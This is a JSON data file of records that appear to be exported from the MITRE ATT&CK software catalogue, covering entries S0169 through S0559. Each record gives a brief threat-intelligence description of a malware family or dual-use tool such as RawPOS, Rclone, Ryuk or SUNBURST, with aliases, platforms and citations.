{"ID":"S0169","name":"RawPOS","description":"[RawPOS](https://attack.mitre.org/software/S0169) is a point-of-sale (POS) malware family that searches for cardholder data on victims. It has been in use since at least 2008. (Citation: Kroll RawPOS Jan 2017) (Citation: TrendMicro RawPOS April 2015) (Citation: Visa RawPOS March 2015) FireEye divides RawPOS into three components: FIENDCRY, DUEBREW, and DRIFTWOOD. (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 Oct 2015)","url":"https://attack.mitre.org/software/S0169","created":"16 January 2018","last modified":"30 March 2020","version":"1.1","contributors":"Walker Johnson","platforms":"Windows","aliases":"DRIFTWOOD, DUEBREW, FIENDCRY","type":"malware","relationship citations":"(Citation: DarkReading FireEye FIN5 Oct 2015),(Citation: Mandiant FIN5 GrrCON Oct 2016),,(Citation: Visa RawPOS March 2015),(Citation: TrendMicro RawPOS April 2015),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Kroll RawPOS Jan 2017)"}
{"ID":"S1040","name":"Rclone","description":"[Rclone](https://attack.mitre.org/software/S1040) is a command line program for syncing files with cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA. [Rclone](https://attack.mitre.org/software/S1040) has been used in a number of ransomware campaigns, including those associated with the [Conti](https://attack.mitre.org/software/S0575) and DarkSide Ransomware-as-a-Service operations.(Citation: Rclone)(Citation: Rclone Wars)(Citation: Detecting Rclone)(Citation: DarkSide Ransomware Gang)(Citation: DFIR Conti Bazar Nov 2021)","url":"https://attack.mitre.org/software/S1040","created":"30 August 2022","last modified":"13 April 2023","version":"1.0","contributors":"Edward Millington; Ian McKay","platforms":"Linux, Windows, macOS","aliases":null,"type":"tool","relationship citations":",(Citation: DFIR Conti Bazar Nov 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Rclone)"}
{"ID":"S0172","name":"Reaver","description":"[Reaver](https://attack.mitre.org/software/S0172) is a malware family that has been in the wild since at least late 2016. Reporting indicates victims have primarily been associated with the \"Five Poisons,\" which are movements the Chinese government considers dangerous. The type of malware is rare due to its final payload being in the form of [Control Panel](https://attack.mitre.org/techniques/T1218/002) items.(Citation: Palo Alto Reaver Nov 2017)","url":"https://attack.mitre.org/software/S0172","created":"16 January 2018","last modified":"09 February 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Palo Alto Reaver Nov 2017)"}
{"ID":"S0153","name":"RedLeaves","description":"[RedLeaves](https://attack.mitre.org/software/S0153) is a malware family used by [menuPass](https://attack.mitre.org/groups/G0045). The code overlaps with [PlugX](https://attack.mitre.org/software/S0013) and may be based upon the open source tool Trochilus. (Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: FireEye APT10 April 2017)","url":"https://attack.mitre.org/software/S0153","created":"14 December 2017","last modified":"23 March 2023","version":"1.1","contributors":"Edward Millington","platforms":"Windows","aliases":"BUGJUICE","type":"malware","relationship citations":"(Citation: DOJ APT10 Dec 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),,(Citation: Accenture Hogfish April 2018),(Citation: FireEye APT10 April 2017),(Citation: PWC Cloud Hopper Technical Annex April 2017)"}
{"ID":"S0075","name":"Reg","description":"[Reg](https://attack.mitre.org/software/S0075) is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. (Citation: Microsoft Reg)\n\nUtilities such as [Reg](https://attack.mitre.org/software/S0075) are known to be used by persistent threats. (Citation: Windows Commands JPCERT)","url":"https://attack.mitre.org/software/S0075","created":"31 May 2017","last modified":"13 October 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":"reg.exe","type":"tool","relationship citations":"(Citation: Kaspersky Turla),(Citation: Rancor Unit42 June 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: Palo Alto OilRig May 2016),(Citation: US-CERT TA18-074A),(Citation: FireEye APT34 Dec 2017),(Citation: McAfee Honeybee),(Citation: Microsoft Reg),(Citation: Pentestlab Stored Credentials)"}
{"ID":"S0511","name":"RegDuke","description":"[RegDuke](https://attack.mitre.org/software/S0511) is a first stage implant written in .NET and used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2017. [RegDuke](https://attack.mitre.org/software/S0511) has been used to control a compromised machine when control of other implants on the machine was lost.(Citation: ESET Dukes October 2019)","url":"https://attack.mitre.org/software/S0511","created":"23 September 2020","last modified":"24 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: ESET Dukes October 2019),(Citation: ESET Dukes October 2019),(Citation: ESET Dukes October 2019)"}
{"ID":"S0019","name":"Regin","description":"[Regin](https://attack.mitre.org/software/S0019) is a malware platform that has targeted victims in a range of industries, including telecom, government, and financial institutions. Some [Regin](https://attack.mitre.org/software/S0019) timestamps date back to 2003. (Citation: Kaspersky Regin)","url":"https://attack.mitre.org/software/S0019","created":"31 May 2017","last modified":"29 June 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Kaspersky Regin)"}
{"ID":"S0332","name":"Remcos","description":"[Remcos](https://attack.mitre.org/software/S0332) is a closed-source tool that is marketed as a remote control and surveillance software by a company called Breaking Security. [Remcos](https://attack.mitre.org/software/S0332) has been observed being used in malware campaigns.(Citation: Riskiq Remcos Jan 2018)(Citation: Talos Remcos Aug 2018)","url":"https://attack.mitre.org/software/S0332","created":"29 January 2019","last modified":"23 December 2022","version":"1.3","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: ESET Operation Spalax Jan 2021),(Citation: Talos Remcos Aug 2018),(Citation: Fortinet Remcos Feb 2017),(Citation: Riskiq Remcos Jan 2018)"}
{"ID":"S0375","name":"Remexi","description":"[Remexi](https://attack.mitre.org/software/S0375) is a Windows-based Trojan that was developed in the C programming language.(Citation: Securelist Remexi Jan 2019)","url":"https://attack.mitre.org/software/S0375","created":"17 April 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Chafer February 2018),(Citation: Symantec Chafer Dec 2015),(Citation: Securelist Remexi Jan 2019),,(Citation: Securelist Remexi Jan 2019)"}
{"ID":"S0166","name":"RemoteCMD","description":"[RemoteCMD](https://attack.mitre.org/software/S0166) is a custom tool used by [APT3](https://attack.mitre.org/groups/G0022) to execute commands on a remote system similar to SysInternal's PSEXEC functionality. (Citation: Symantec Buckeye)","url":"https://attack.mitre.org/software/S0166","created":"16 January 2018","last modified":"31 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Buckeye),,(Citation: Symantec Buckeye)"}
{"ID":"S0592","name":"RemoteUtilities","description":"[RemoteUtilities](https://attack.mitre.org/software/S0592) is a legitimate remote administration tool that has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2021 for execution on target machines.(Citation: Trend Micro Muddy Water March 2021)","url":"https://attack.mitre.org/software/S0592","created":"18 March 2021","last modified":"25 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Trend Micro Muddy Water March 2021),,(Citation: Trend Micro Muddy Water March 2021)"}
{"ID":"S0125","name":"Remsec","description":"[Remsec](https://attack.mitre.org/software/S0125) is a modular backdoor that has been used by [Strider](https://attack.mitre.org/groups/G0041) and appears to have been designed primarily for espionage purposes. Many of its modules are written in Lua. (Citation: Symantec Strider Blog)","url":"https://attack.mitre.org/software/S0125","created":"31 May 2017","last modified":"28 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":"Backdoor.Remsec, ProjectSauron","type":"malware","relationship citations":"(Citation: Symantec Strider Blog),(Citation: Kaspersky ProjectSauron Blog),,(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Symantec Remsec IOCs)"}
{"ID":"S0174","name":"Responder","description":"Responder is an open source tool used for LLMNR, NBT-NS and MDNS poisoning, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. (Citation: GitHub Responder)","url":"https://attack.mitre.org/software/S0174","created":"16 January 2018","last modified":"17 March 2023","version":"1.2","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: FireEye APT28 Hospitality Aug 2017),(Citation: US District Court Indictment GRU Oct 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: GitHub Responder)"}
{"ID":"S0379","name":"Revenge RAT","description":"[Revenge RAT](https://attack.mitre.org/software/S0379) is a freely available remote access tool written in .NET (C#).(Citation: Cylance Shaheen Nov 2018)(Citation: Cofense RevengeRAT Feb 2019)","url":"https://attack.mitre.org/software/S0379","created":"02 May 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cylance Shaheen Nov 2018),,(Citation: Cofense RevengeRAT Feb 2019),(Citation: Cylance Shaheen Nov 2018)"}
{"ID":"S0433","name":"Rifdoor","description":"[Rifdoor](https://attack.mitre.org/software/S0433) is a remote access trojan (RAT) that shares numerous code similarities with [HotCroissant](https://attack.mitre.org/software/S0431).(Citation: Carbon Black HotCroissant April 2020)","url":"https://attack.mitre.org/software/S0433","created":"05 May 2020","last modified":"08 May 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),,(Citation: Carbon Black HotCroissant April 2020)"}
{"ID":"S0448","name":"Rising Sun","description":"[Rising Sun](https://attack.mitre.org/software/S0448) is a modular backdoor that was used extensively in [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013) between 2017 and 2019. [Rising Sun](https://attack.mitre.org/software/S0448) infected at least 87 organizations around the world, including nuclear, defense, energy, and financial service companies. Security researchers assessed [Rising Sun](https://attack.mitre.org/software/S0448) included some source code from [Lazarus Group](https://attack.mitre.org/groups/G0032)'s Trojan Duuzer.(Citation: McAfee Sharpshooter December 2018)","url":"https://attack.mitre.org/software/S0448","created":"14 May 2020","last modified":"13 October 2022","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: McAfee Sharpshooter December 2018),(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: McAfee Sharpshooter December 2018)"}
{"ID":"S0400","name":"RobbinHood","description":"[RobbinHood](https://attack.mitre.org/software/S0400) is ransomware that was first observed being used in an attack against the Baltimore city government's computer network.(Citation: CarbonBlack RobbinHood May 2019)(Citation: BaltimoreSun RobbinHood May 2019)","url":"https://attack.mitre.org/software/S0400","created":"29 July 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: CarbonBlack RobbinHood May 2019)"}
{"ID":"S0270","name":"RogueRobin","description":"[RogueRobin](https://attack.mitre.org/software/S0270) is a payload used by [DarkHydrus](https://attack.mitre.org/groups/G0079) that has been developed in PowerShell and C#. (Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019)","url":"https://attack.mitre.org/software/S0270","created":"17 October 2018","last modified":"22 March 2023","version":"2.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 DarkHydrus July 2018),(Citation: Unit42 DarkHydrus Jan 2019),,(Citation: Unit 42 DarkHydrus July 2018),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: GitHub Invoke-Obfuscation)"}
{"ID":"S0090","name":"Rover","description":"[Rover](https://attack.mitre.org/software/S0090) is malware suspected of being used for espionage purposes. It was used in 2015 in a targeted email sent to an Indian Ambassador to Afghanistan. (Citation: Palo Alto Rover)","url":"https://attack.mitre.org/software/S0090","created":"31 May 2017","last modified":"17 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Palo Alto Rover)"}
{"ID":"S1073","name":"Royal","description":"[Royal](https://attack.mitre.org/software/S1073) is ransomware that first appeared in early 2022;  a version that also targets ESXi servers was later observed in February 2023. [Royal](https://attack.mitre.org/software/S1073) employs partial encryption and multiple threads to evade detection and speed encryption. [Royal](https://attack.mitre.org/software/S1073) has been used in attacks against multiple industries worldwide--including critical infrastructure. Security researchers have identified similarities in the encryption routines and TTPs used in [Royal](https://attack.mitre.org/software/S1073) and [Conti](https://attack.mitre.org/software/S0575) attacks and noted a possible connection between their operators.(Citation: Microsoft Royal ransomware November 2022)(Citation: Cybereason Royal December 2022)(Citation: Kroll Royal Deep Dive February 2023)(Citation: Trend Micro Royal Linux ESXi February 2023)(Citation: CISA Royal AA23-061A March 2023)","url":"https://attack.mitre.org/software/S1073","created":"30 March 2023","last modified":"17 April 2023","version":"1.0","contributors":"Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Wataru Takahashi, NEC Corporation","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: CISA Royal AA23-061A March 2023),(Citation: Kroll Royal Deep Dive February 2023),(Citation: Cybereason Royal December 2022),(Citation: Trend Micro Royal Linux ESXi February 2023)"}
{"ID":"S1071","name":"Rubeus","description":"[Rubeus](https://attack.mitre.org/software/S1071) is a C# toolset designed for raw Kerberos interaction that has been used since at least 2020, including in ransomware operations.(Citation: GitHub Rubeus March 2023)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed Run November 2020)","url":"https://attack.mitre.org/software/S1071","created":"29 March 2023","last modified":"13 April 2023","version":"1.0","contributors":"Akshat Pradhan, Qualys; Mayuresh Dani, Qualys","platforms":"Windows","aliases":null,"type":"tool","relationship citations":",,(Citation: GitHub Rubeus March 2023),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: DFIR Ryuk's Return October 2020)"}
{"ID":"S0358","name":"Ruler","description":"[Ruler](https://attack.mitre.org/software/S0358) is a tool to abuse Microsoft Exchange services. It is publicly available on GitHub and the tool is executed via the command line. The creators of [Ruler](https://attack.mitre.org/software/S0358) have also released a defensive tool, NotRuler, to detect its usage.(Citation: SensePost Ruler GitHub)(Citation: SensePost NotRuler)","url":"https://attack.mitre.org/software/S0358","created":"04 February 2019","last modified":"22 June 2020","version":"1.1","contributors":null,"platforms":"Office 365, Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Microsoft Holmium June 2020),(Citation: FireEye APT33 Guardrail),,(Citation: SensePost Ruler GitHub)"}
{"ID":"S0253","name":"RunningRAT","description":"[RunningRAT](https://attack.mitre.org/software/S0253) is a remote access tool that appeared in operations surrounding the 2018 Pyeongchang Winter Olympics along with [Gold Dragon](https://attack.mitre.org/software/S0249) and [Brave Prince](https://attack.mitre.org/software/S0252). (Citation: McAfee Gold Dragon)","url":"https://attack.mitre.org/software/S0253","created":"17 October 2018","last modified":"21 April 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: McAfee Gold Dragon)"}
{"ID":"S0446","name":"Ryuk","description":"[Ryuk](https://attack.mitre.org/software/S0446) is a ransomware designed to target enterprise environments that has been used in attacks since at least 2018. [Ryuk](https://attack.mitre.org/software/S0446) shares code similarities with Hermes ransomware.(Citation: CrowdStrike Ryuk January 2019)(Citation: FireEye Ryuk and Trickbot January 2019)(Citation: FireEye FIN6 Apr 2019)","url":"https://attack.mitre.org/software/S0446","created":"13 May 2020","last modified":"24 May 2022","version":"1.3","contributors":"Matt Brenton, Zurich Insurance Group; The DFIR Report, @TheDFIRReport","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: Sophos New Ryuk Attack October 2020),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: CrowdStrike Ryuk January 2019),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: DFIR Ryuk's Return October 2020),,(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: Bleeping Computer - Ryuk WoL),(Citation: CrowdStrike Ryuk January 2019),(Citation: ANSSI RYUK RANSOMWARE),(Citation: CrowdStrike Wizard Spider October 2020)"}
{"ID":"S0085","name":"S-Type","description":"[S-Type](https://attack.mitre.org/software/S0085) is a backdoor that was used in [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) since at least 2013.(Citation: Cylance Dust Storm)","url":"https://attack.mitre.org/software/S0085","created":"31 May 2017","last modified":"10 March 2023","version":"1.3","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Cylance Dust Storm),(Citation: Cylance Dust Storm),(Citation: Microsoft DTC)"}
{"ID":"S0461","name":"SDBbot","description":"[SDBbot](https://attack.mitre.org/software/S0461) is a backdoor with installer and loader components that has been used by [TA505](https://attack.mitre.org/groups/G0092) since at least 2019.(Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020)","url":"https://attack.mitre.org/software/S0461","created":"01 June 2020","last modified":"18 July 2022","version":"2.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: IBM TA505 April 2020),(Citation: Proofpoint TA505 October 2019),,(Citation: IBM TA505 April 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Korean FSI TA505 2020)"}
{"ID":"S0195","name":"SDelete","description":"[SDelete](https://attack.mitre.org/software/S0195) is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools. (Citation: Microsoft SDelete July 2016)","url":"https://attack.mitre.org/software/S0195","created":"18 April 2018","last modified":"12 August 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: PTSecurity Cobalt Dec 2016),(Citation: Mandiant No Easy Breach),(Citation: Group IB Silence Sept 2018),(Citation: Mandiant FIN5 GrrCON Oct 2016),,(Citation: Microsoft SDelete July 2016)"}
{"ID":"S0185","name":"SEASHARPEE","description":"[SEASHARPEE](https://attack.mitre.org/software/S0185) is a Web shell that has been used by [OilRig](https://attack.mitre.org/groups/G0049). (Citation: FireEye APT34 Webinar Dec 2017)","url":"https://attack.mitre.org/software/S0185","created":"16 January 2018","last modified":"23 April 2021","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT34 Webinar Dec 2017),,(Citation: FireEye APT34 Webinar Dec 2017)"}
{"ID":"S0450","name":"SHARPSTATS","description":"[SHARPSTATS](https://attack.mitre.org/software/S0450) is a .NET backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2019.(Citation: TrendMicro POWERSTATS V3 June 2019)","url":"https://attack.mitre.org/software/S0450","created":"18 May 2020","last modified":"22 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: TrendMicro POWERSTATS V3 June 2019),,(Citation: TrendMicro POWERSTATS V3 June 2019)"}
{"ID":"S0028","name":"SHIPSHAPE","description":"[SHIPSHAPE](https://attack.mitre.org/software/S0028) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)","url":"https://attack.mitre.org/software/S0028","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT30),,(Citation: FireEye APT30)"}
{"ID":"S0063","name":"SHOTPUT","description":"[SHOTPUT](https://attack.mitre.org/software/S0063) is a custom backdoor used by [APT3](https://attack.mitre.org/groups/G0022). (Citation: FireEye Clandestine Wolf)","url":"https://attack.mitre.org/software/S0063","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Backdoor.APT.CookieCutter, Pirpi","type":"malware","relationship citations":"(Citation: FireEye Clandestine Wolf),,(Citation: FireEye Clandestine Wolf),(Citation: Palo Alto CVE-2015-3113 July 2015)"}
{"ID":"S0217","name":"SHUTTERSPEED","description":"[SHUTTERSPEED](https://attack.mitre.org/software/S0217) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)","url":"https://attack.mitre.org/software/S0217","created":"18 April 2018","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT37 Feb 2018),,(Citation: FireEye APT37 Feb 2018)"}
{"ID":"S0692","name":"SILENTTRINITY","description":"[SILENTTRINITY](https://attack.mitre.org/software/S0692) is an open source remote administration and post-exploitation framework primarily written in Python that includes stagers written in Powershell, C, and Boo. [SILENTTRINITY](https://attack.mitre.org/software/S0692) was used in a 2019 campaign against Croatian government agencies by unidentified cyber actors.(Citation: GitHub SILENTTRINITY March 2022)(Citation: Security Affairs SILENTTRINITY July 2019)","url":"https://attack.mitre.org/software/S0692","created":"23 March 2022","last modified":"14 April 2023","version":"1.0","contributors":"Daniel Acevedo, @darmad0, ARMADO","platforms":"Windows","aliases":null,"type":"tool","relationship citations":",,(Citation: Security Affairs SILENTTRINITY July 2019),(Citation: GitHub SILENTTRINITY March 2022),(Citation: GitHub SILENTTRINITY Modules July 2019)"}
{"ID":"S0533","name":"SLOTHFULMEDIA","description":"[SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) is a remote access Trojan written in C++ that has been used by an unidentified \"sophisticated cyber actor\" since at least January 2017.(Citation: CISA MAR SLOTHFULMEDIA October 2020)(Citation: Costin Raiu IAmTheKing October 2020) It has been used to target government organizations, defense contractors, universities, and energy companies in Russia, India, Kazakhstan, Kyrgyzstan, Malaysia, Ukraine, and Eastern Europe.(Citation: USCYBERCOM SLOTHFULMEDIA October 2020)(Citation: Kaspersky IAmTheKing October 2020)  \n\nIn October 2020, Kaspersky Labs assessed [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) is part of an activity cluster it refers to as \"IAmTheKing\".(Citation: Kaspersky IAmTheKing October 2020) ESET also noted code similarity between [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) and droppers used by a group it refers to as \"PowerPool\".(Citation: ESET PowerPool Code October 2020) ","url":"https://attack.mitre.org/software/S0533","created":"16 November 2020","last modified":"13 April 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":"JackOfHearts, QueenOfClubs","type":"malware","relationship citations":",,(Citation: CISA MAR SLOTHFULMEDIA October 2020)"}
{"ID":"S0218","name":"SLOWDRIFT","description":"[SLOWDRIFT](https://attack.mitre.org/software/S0218) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) against academic and strategic victims in South Korea. (Citation: FireEye APT37 Feb 2018)","url":"https://attack.mitre.org/software/S0218","created":"18 April 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT37 Feb 2018),,(Citation: FireEye APT37 Feb 2018)"}
{"ID":"S0649","name":"SMOKEDHAM","description":"[SMOKEDHAM](https://attack.mitre.org/software/S0649) is a Powershell-based .NET backdoor that was first reported in May 2021; it has been used by at least one ransomware-as-a-service affiliate.(Citation: FireEye Shining A Light on DARKSIDE May 2021)(Citation: FireEye SMOKEDHAM June 2021)","url":"https://attack.mitre.org/software/S0649","created":"22 September 2021","last modified":"14 April 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: FireEye SMOKEDHAM June 2021)"}
{"ID":"S0159","name":"SNUGRIDE","description":"[SNUGRIDE](https://attack.mitre.org/software/S0159) is a backdoor that has been used by [menuPass](https://attack.mitre.org/groups/G0045) as first stage malware. (Citation: FireEye APT10 April 2017)","url":"https://attack.mitre.org/software/S0159","created":"14 December 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT10 April 2017),,(Citation: FireEye APT10 April 2017)"}
{"ID":"S0157","name":"SOUNDBITE","description":"[SOUNDBITE](https://attack.mitre.org/software/S0157) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)","url":"https://attack.mitre.org/software/S0157","created":"14 December 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT32 May 2017),,(Citation: FireEye APT32 May 2017)"}
{"ID":"S0035","name":"SPACESHIP","description":"[SPACESHIP](https://attack.mitre.org/software/S0035) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)","url":"https://attack.mitre.org/software/S0035","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT30),,(Citation: FireEye APT30)"}
{"ID":"S0390","name":"SQLRat","description":"[SQLRat](https://attack.mitre.org/software/S0390) is malware that executes SQL scripts to avoid leaving traditional host artifacts. [FIN7](https://attack.mitre.org/groups/G0046) has been observed using it.(Citation: Flashpoint FIN 7 March 2019)","url":"https://attack.mitre.org/software/S0390","created":"18 June 2019","last modified":"22 March 2023","version":"1.2","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: Flashpoint FIN 7 March 2019),,(Citation: Flashpoint FIN 7 March 2019)"}
{"ID":"S1037","name":"STARWHALE","description":"[STARWHALE](https://attack.mitre.org/software/S1037) is Windows Script File (WSF) backdoor that has been used by [MuddyWater](https://attack.mitre.org/groups/G0069), possibly since at least November 2021; there is also a [STARWHALE](https://attack.mitre.org/software/S1037) variant written in Golang with similar capabilities. Security researchers have also noted the use of [STARWHALE](https://attack.mitre.org/software/S1037) by UNC3313, which may be associated with [MuddyWater](https://attack.mitre.org/groups/G0069).(Citation: Mandiant UNC3313 Feb 2022)(Citation: DHS CISA AA22-055A MuddyWater February 2022)","url":"https://attack.mitre.org/software/S1037","created":"18 August 2022","last modified":"14 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":"CANOPY","type":"malware","relationship citations":"(Citation: DHS CISA AA22-055A MuddyWater February 2022),,(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Mandiant UNC3313 Feb 2022)"}
{"ID":"S1042","name":"SUGARDUMP","description":"[SUGARDUMP](https://attack.mitre.org/software/S1042) is a proprietary browser credential harvesting tool that was used by UNC3890 during the [C0010](https://attack.mitre.org/campaigns/C0010) campaign. The first known [SUGARDUMP](https://attack.mitre.org/software/S1042) version was used since at least early 2021, a second SMTP C2 version was used from late 2021-early 2022, and a third HTTP C2 variant was used since at least April 2022.(Citation: Mandiant UNC3890 Aug 2022)","url":"https://attack.mitre.org/software/S1042","created":"21 September 2022","last modified":"04 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Mandiant UNC3890 Aug 2022),(Citation: Mandiant UNC3890 Aug 2022)"}
{"ID":"S1049","name":"SUGARUSH","description":"[SUGARUSH](https://attack.mitre.org/software/S1049) is a small custom backdoor that can establish a reverse shell over TCP to a hard coded C2 address. [SUGARUSH](https://attack.mitre.org/software/S1049) was first identified during analysis of UNC3890's [C0010](https://attack.mitre.org/campaigns/C0010) campaign targeting Israeli companies, which began in late 2020.(Citation: Mandiant UNC3890 Aug 2022)","url":"https://attack.mitre.org/software/S1049","created":"04 October 2022","last modified":"04 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Mandiant UNC3890 Aug 2022),(Citation: Mandiant UNC3890 Aug 2022)"}
{"ID":"S0559","name":"SUNBURST","description":"[SUNBURST](https://attack.mitre.org/software/S0559) is a trojanized DLL designed to fit within the SolarWinds Orion software update framework. It was used by [APT29](https://attack.mitre.org/groups/G0016) since at least February 2020.(Citation: SolarWinds Sunburst Sunspot Update January 2021)(Citation: Microsoft Deep Dive Solorigate January 2021)","url":"https://attack.mitre.org/software/S0559","created":"05 January 2021","last modified":"27 March 2023","version":"2.4","contributors":"Daniyal Naeem, BT Security; Matt Brenton, Zurich Insurance Group","platforms":"Windows","aliases":"Solorigate","type":"malware","relationship citations":"(Citation: Secureworks IRON RITUAL Profile),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: MSTIC NOBELIUM May 2021),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: CheckPoint Sunburst & Teardrop December 2020),(Citation: Symantec Sunburst Sending Data January 2021),(Citation: SolarWinds Sunburst Sunspot Update January 2021),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Symantec Sunburst Sending Data January 2021),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Microsoft Analyzing Solorigate Dec 2020)"}
